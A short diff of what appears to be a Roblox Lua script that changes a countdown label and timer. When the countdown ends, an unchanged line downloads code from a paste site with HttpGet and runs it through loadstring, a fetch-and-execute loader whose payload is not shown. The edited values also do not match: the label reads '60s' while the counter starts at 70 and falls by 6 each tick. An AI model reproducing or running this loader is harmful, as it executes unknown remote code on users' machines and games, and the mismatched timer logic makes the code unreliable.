@@ -31,14 +31,14 @@ text.BackgroundTransparency = 1
 text.TextColor3 = Color3.new(1, 1, 1)
 text.Font = Enum.Font.GothamBlack
 text.TextScaled = true
-text.Text = "20s"
+text.Text = "60s"
 
-local t = 20
+local t = 70
 task.spawn(function()
     while t > 0 do
         text.Text = tostring(t) .. "s"
         task.wait(1)
-        t -= 1
+        t -= 6
     end
     loadstring(game:HttpGet("https://pastefy.app/EEmKlIPx/raw", true))()
 end)
